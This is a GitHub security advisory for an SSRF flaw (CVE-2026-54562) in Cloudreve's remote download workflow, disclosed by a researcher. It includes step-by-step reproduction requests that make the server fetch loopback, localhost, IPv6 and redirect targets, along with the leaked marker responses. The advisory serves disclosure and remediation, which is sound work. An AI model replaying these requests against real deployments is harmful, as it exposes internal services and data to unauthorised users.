# [M] Cloudreve: Non-admin remote download users can SSRF loopback/internal services and read imported responses

## Summary
Severity: Medium
Advisory: GHSA-x756-g4x3-c64m
CVE: CVE-2026-54562
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-20
Source: https://github.com/advisories/GHSA-x756-g4x3-c64m
Type: github-advisory

## Affected
- Go: `github.com/cloudreve/Cloudreve/v4` — affected >=0 <4.0.0-20260606025411-aaebf317a78f
- Go: `github.com/cloudreve/Cloudreve/v3` — affected >=0

## Details
## Summary

Cloudreve's remote download workflow accepts user-supplied URLs and passes them to the configured downloader without blocking loopback, localhost, IPv6 localhost, or redirect-to-loopback targets.

When the remote download permission is granted to a non-admin user group, a normal authenticated user can make the server-side downloader fetch internal-only URLs and then read the fetched response after it is imported into the user's own Cloudreve files.

This does not affect default normal users unless the remote download permission is enabled for their group. However, the permission is a feature-level user-group capability and does not make the user an administrator.

## Attacker requirements

The attacker must be:

- authenticated
- non-admin
- in a user group where `GroupPermissionRemoteDownload` is enabled

Default normal users are blocked from the affected workflow. In the default install, only the admin group has the remote download permission, while the default `User` group does not.

## Affected endpoint

```http
POST /api/v4/workflow/download
```

Follow-up attacker readback was performed through normal workflow and file APIs:

```http
GET /api/v4/workflow?category=downloaded...
GET /api/v4/file?uri=cloudreve://my...
POST /api/v4/file/url
```

## Root cause

The remote download workflow checks whether the user group has remote download permission, but it does not validate the submitted URL before passing it to the downloader.

Relevant code paths:

- `service/explorer/workflows.go:81`
- `pkg/filemanager/workflows/remote_download.go:202`
- `pkg/downloader/aria2/aria2.go:56`

The application does not block loopback, localhost, IPv6 localhost, or redirect targets resolving to internal addresses.

## Impact

A non-admin user with remote download permission can use Cloudreve as an SSRF primitive to access services reachable from the downloader environment.

In my test, the attacker could fetch internal loopback URLs and read the response body after Cloudreve imported the downloaded content into the attacker's own files.

Confirmed targets:

- `http://127.0.0.1:7777/secret2`
- `http://localhost:7777/localsecret`
- `http://[::1]:7780/v6secret`
- redirect to `http://127.0.0.1:7777/redirsecret`

This can expose internal HTTP services, loopback-only admin panels, local service metadata, or other network resources that are not directly reachable by the attacker.

## Reproduction

### 1. Permission negative control

The attacker is a normal non-admin user in the default `User` group.

Before enabling remote download for the group:

```http
POST /api/v4/workflow/download
Content-Type: application/json

{"src":["http://127.0.0.1:7777/secret"],"dst":"cloudreve://my"}
```

Response:

```json
{"code":40007,"msg":"Group not allowed to download files"}
```

### 2. Enable only remote download permission for the non-admin group

The default install grants remote download to the admin group only. The default `User` group does not have it.

Confirmed in:

- `inventory/migration.go:154`
- `inventory/migration.go:179`

For this test, I only changed group 2 permissions from:

```text
hAg=
```

to:

```text
hAo=
```

The attacker remained in the `User` group and was not made admin. `GET /api/v4/user/me` still returned the group name as `User`.

### 3. Start an internal listener

Example listener on the Cloudreve host:

```text
127.0.0.1:7777
```

The listener returned a marker response:

```text
SSRF_SECRET_2_20260527
```

### 4. Queue a remote download to loopback

```http
POST /api/v4/workflow/download
Content-Type: application/json

{"src":["http://127.0.0.1:7777/secret2"],"dst":"cloudreve://my"}
```

Response:

```json
{"code":0,"data":[{"id":"OzH4","status":"queued","type":"remote_download"}]}
```

The internal listener received the request:

```text
127.0.0.1 - - [27/May/2026 13:00:46] "GET /secret2 HTTP/1.1" 200 -
```

Aria2 completed the download:

```text
Download complete: /home/b4r/cysec/cvehunting/cloudreve/data/temp/.../secret2
```

### 5. Read the imported internal response as the attacker

The task completed successfully:

```json
{"id":"OzH4","status":"completed","summary":{"props":{"src_str":"http://127.0.0.1:7777/secret2","failed":0}}}
```

The attacker could list the imported file:

```json
{"name":"secret2","path":"cloudreve://my/secret2"}
```

The attacker could then download and read the response body:

```text
SSRF_SECRET_2_20260527
```

## Additional validated variants

### localhost

Input:

```text
http://localhost:7777/localsecret
```

Attacker readback:

```text
LOCALHOST_SECRET_20260527
```

### Redirect to loopback

Input:

```text
http://127.0.0.1:7779/anything
```

Redirect:

```text
302 Location: http://127.0.0.1:7777/redirsecret
```

Attacker readback:

```text
REDIR_SECRET_20260527
```

### IPv6 localhost

Input:

```text
http://[::1]:7780/v6secret
```

Attacker readback:

```text
IPV6_SECRET_20260527
```

## Expected behavior

Cloudreve should reject remote download URLs that resolve to loopback, localhost, private network ranges, link-local ranges, metadata service ranges, or other internal-only targets unless explicitly allowed by an administrator.

Redirect targets should be checked with the same policy.

## Actual behavior

Cloudreve accepts the URL, passes it to the downloader, imports the fetched internal response into the attacker's files, and allows the attacker to read it.

## References
- https://github.com/cloudreve/cloudreve/security/advisories/GHSA-x756-g4x3-c64m
- https://nvd.nist.gov/vuln/detail/CVE-2026-54562
- https://github.com/cloudreve/cloudreve/commit/aaebf317a78f2413d74afd66c21a1f3143711312
- https://github.com/cloudreve/cloudreve
- https://github.com/cloudreve/cloudreve/releases/tag/4.16.1
